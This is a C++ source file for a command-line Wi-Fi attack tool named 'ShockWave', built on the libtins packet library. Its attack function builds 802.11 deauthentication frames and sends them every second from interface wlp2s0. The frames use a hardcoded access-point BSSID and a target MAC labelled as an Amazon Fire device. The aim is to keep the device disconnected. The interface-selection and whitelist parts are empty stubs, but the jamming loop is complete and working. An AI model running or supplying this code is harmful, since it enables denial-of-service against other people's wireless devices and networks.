#include "CLI.h"

using namespace std;
using namespace Tins;

CLI::CLI()
{
    state = ATTACK;
}

CLI::~CLI()
{
    //dtor
}

void CLI::mainLoop() {
    while(true) {
        showMenu();
        usleep(100000);
    }
}

void CLI::showHeader() {
    cout << "-------------------ShockWave---------------" << endl;
    cout << "----------------By Transpalette------------" << endl;
    cout << "--------------Use at your own risk---------" << endl;
    cout << "*******************************************" << endl;
}

void CLI::listInterfaces() {

}

void CLI::showAction() {
    switch(state) {
        case CHOOSEIF:
            listInterfaces();
            int interfaceNo;
            cout << "Interface: ";
            cin >> interfaceNo;
        break;
        case WHITELIST:
        break;
        case ATTACK:
            attack();
        break;
    }
}

void CLI::showMenu() {
    system("clear");
    showHeader();
    showAction();
}

void CLI::attack() {
    PacketSender sender;
    HWAddress<6> bssid("AE:28:06:AD:19:70");

    cout << "-> BSSID: " << bssid << endl;

    //HWAddress<6> target("10:66:75:48:f1:98"); //Elephone P8000
    HWAddress<6> target("40:b4:cd:6e:de:d5"); //Amazon Fire

    cout << "-> Target: " << target << endl;

    Dot11Deauthentication deauth = Dot11Deauthentication(target, bssid); //Set target / sender
    deauth.addr3(bssid); //Set the BSSID
    deauth.reason_code(0x0007);
    RadioTap radio = RadioTap() / deauth;

    cout << "Deauthenticating... (ctrl+c to stop)" << endl;

    while (true) {
        sender.send(radio, "wlp2s0");
        usleep(1000000);
    }
}
